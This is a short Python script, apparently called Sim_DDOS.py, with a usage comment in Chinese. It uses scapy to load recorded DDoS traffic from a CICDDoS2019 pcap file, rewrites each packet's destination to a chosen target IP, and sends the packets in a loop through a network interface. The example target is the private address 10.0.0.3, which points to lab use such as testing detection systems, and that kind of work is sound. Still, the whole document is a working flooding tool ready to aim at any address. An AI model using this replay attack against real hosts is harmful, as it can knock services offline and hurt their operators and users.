from scapy.all import *
import argparse

# 定义攻击函数
def attack(pcap_file, target_ip, iface):
    try:
        # 加载CICDDoS2019数据集中的pcap文件
        packets = rdpcap(pcap_file)
        print(f"Loaded {len(packets)} packets from {pcap_file}")

        # 循环发送数据包
        for i, packet in enumerate(packets):
            # 替换目的IP地址为目标IP
            if IP in packet:
                packet[IP].dst = target_ip
                sendp(packet, iface=iface, verbose=False)
            if (i + 1) % 100 == 0:
                print(f"Sent {i + 1}/{len(packets)} packets...")

        print(f"Finished sending all {len(packets)} packets to {target_ip} on interface {iface}")

    except Exception as e:
        print(f"Error during attack: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate network traffic using a pcap file.")
    parser.add_argument("pcap_file", help="Path to the pcap file")
    parser.add_argument("target_ip", help="Target IP address to send packets to")
    parser.add_argument("--iface", default="eth0", help="Network interface to send packets through (default: eth0)")

    args = parser.parse_args()

    attack(args.pcap_file, args.target_ip, args.iface)



################################################################################################
#                                                                                              #
#    ① 在命令行中运行脚本时，您可以指定 pcap 文件路径、目标 IP 和网络接口：                          #
#                                                                                              #
#      python Sim_DDOS.py path_to_your_pcap_file.pcap(流量文件路径)10.0.0.3 --iface eth0        #  
#                                                                                              #
#      这将从指定的 pcap 文件中加载数据包，并将它们发送到目标 IP 10.0.0.3，使用指定的网络接口 eth0。  #
#                                                                                              #
#                                                                                              #
################################################################################################
